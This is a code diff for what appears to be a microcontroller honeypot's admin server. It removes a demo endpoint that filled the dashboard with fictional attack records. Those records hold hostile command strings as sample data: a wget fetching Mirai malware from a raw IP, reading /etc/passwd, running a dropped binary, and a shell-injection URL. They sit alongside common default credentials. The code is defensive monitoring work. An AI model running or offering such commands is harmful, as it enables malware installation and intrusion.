@@ -15,14 +15,6 @@
 #include <stdbool.h>
 #include <string.h>
 #include <stdio.h>
-#include <time.h>
-
-// Demo/showcase endpoint: POST /api/demo injects a set of synthetic attacks so
-// the dashboard fills with a varied feed for screenshots / demo GIFs. Set to 0
-// to remove it from a real deployment.
-#ifndef DEMO_ENDPOINT_ENABLE
-#define DEMO_ENDPOINT_ENABLE 1
-#endif
 
 static const char *TAG = "ADMIN";
 
@@ -254,52 +246,6 @@ static void serve_attacks_json(int sock)
     send(sock, json, pos, 0);
 }
 
-#if DEMO_ENDPOINT_ENABLE
-// Inject a curated, fictional attack set for screenshots / demo GIFs. Uses fake
-// MACs (recognised OUIs → nice vendor labels) and public source IPs from many
-// countries so GeoIP paints real country flags. Persisted like any attack (wipe
-// with Clear); never sends Telegram (log_store_append doesn't), so no bot spam.
-// Injected with a short gap so the live WebSocket feed streams them in one by one.
-static void serve_demo(int sock)
-{
-    static const struct {
-        uint8_t type; const char *ip; uint8_t mac[6];
-        const char *user, *pass, *payload;
-    } D[] = {
-        {ATTACK_SSH,   "218.92.0.55",    {0xC0,0x56,0xE3,0x11,0x22,0x33}, "root","123456","SSH login root:123456"},
-        {ATTACK_SHELL, "218.92.0.55",    {0xC0,0x56,0xE3,0x11,0x22,0x33}, "root","","$ wget http://45.9.148.2/mirai.x86"},
-        {ATTACK_TELNET,"103.207.36.20",  {0x50,0xC7,0xBF,0xAA,0xBB,0xCC}, "admin","admin","Telnet admin:admin"},
-        {ATTACK_SHELL, "103.207.36.20",  {0x50,0xC7,0xBF,0xAA,0xBB,0xCC}, "admin","","$ cat /etc/passwd"},
-        {ATTACK_HTTP,  "185.220.101.50", {0xE6,0x4A,0x1B,0x7C,0x3D,0x9F}, "admin","password","POST /login  login=admin:password  ua=zgrab"},
-        {ATTACK_RTSP,  "45.227.254.10",  {0x44,0x19,0xB6,0x01,0x02,0x03}, "admin","12345","RTSP admin:12345"},
-        {ATTACK_FTP,   "91.241.19.30",   {0x3C,0xEF,0x8C,0x44,0x55,0x66}, "anonymous","guest","FTP anonymous:guest"},
-        {ATTACK_SSH,   "200.7.96.10",    {0xB8,0x27,0xEB,0x77,0x88,0x99}, "root","root","SSH login root:root"},
-        {ATTACK_SHELL, "200.7.96.10",    {0xB8,0x27,0xEB,0x77,0x88,0x99}, "root","","$ chmod +x .x && ./.x"},
-        {ATTACK_TELNET,"196.10.52.40",   {0x28,0x6C,0x07,0x12,0x34,0x56}, "root","t0talc0ntr0l4!","Telnet root:t0talc0ntr0l4!"},
-        {ATTACK_SSH,   "80.94.92.20",    {0x3C,0xA9,0xF4,0x0A,0x0B,0x0C}, "ubuntu","ubuntu","SSH login ubuntu:ubuntu"},
-        {ATTACK_HTTP,  "1.117.20.5",     {0xE2,0x11,0x33,0x55,0x77,0x99}, "","","GET /shell?cmd=cd+/tmp;wget  ua=Hello, world"},
-        {ATTACK_ARP,   "192.168.1.1",    {0xDE,0xAD,0xBE,0xEF,0x00,0x01}, "","","Gateway 192.168.1.1 MAC changed -> de:ad:be:ef:00:01"},
-        {ATTACK_WIFI,  "0.0.0.0",        {0,0,0,0,0,0},                   "","","Deauth attack: 4 forced disconnects in 10000ms (handshake capture likely)"},
-        {ATTACK_FTP,   "45.95.147.7",    {0x52,0x54,0x00,0xAB,0xCD,0xEF}, "admin","admin123","FTP admin:admin123"},
-        {ATTACK_RTSP,  "103.97.176.9",   {0x90,0x02,0xA9,0x21,0x43,0x65}, "admin","","RTSP admin:(empty)"},
-    };
-    int n = (int)(sizeof(D) / sizeof(D[0]));
-    uint32_t now = (uint32_t)time(NULL);
-    for (int i = 0; i < n; i++) {
-        attack_log_t e = { .type = D[i].type, .timestamp = now - (uint32_t)((n - i) * 17) };
-        e.src_ip = (uint32_t)inet_addr(D[i].ip);
-        memcpy(e.src_mac, D[i].mac, 6);
-        strlcpy(e.username, D[i].user, sizeof(e.username));
-        strlcpy(e.password, D[i].pass, sizeof(e.password));
-        strlcpy(e.payload,  D[i].payload, sizeof(e.payload));
-        log_store_append(&e);
-        vTaskDelay(pdMS_TO_TICKS(250));      // stream into the live feed one by one
-    }
-    ESP_LOGI(TAG, "Injected %d demo attacks", n);
-    send_204(sock);
-}
-#endif  // DEMO_ENDPOINT_ENABLE
-
 // ── Request dispatch ──────────────────────────────────────────────────────────
 
 static void handle_client(int sock)
@@ -326,10 +272,6 @@ static void handle_client(int sock)
         log_store_clear();
         ESP_LOGI(TAG, "Logs cleared via admin panel");
         send_204(sock);
-#if DEMO_ENDPOINT_ENABLE
-    } else if (strncmp(buf, "POST", 4) == 0 && strstr(buf, " /api/demo")) {
-        serve_demo(sock);
-#endif
     } else if (strncmp(buf, "GET", 3) == 0) {
         serve_dashboard(sock);
     } else {
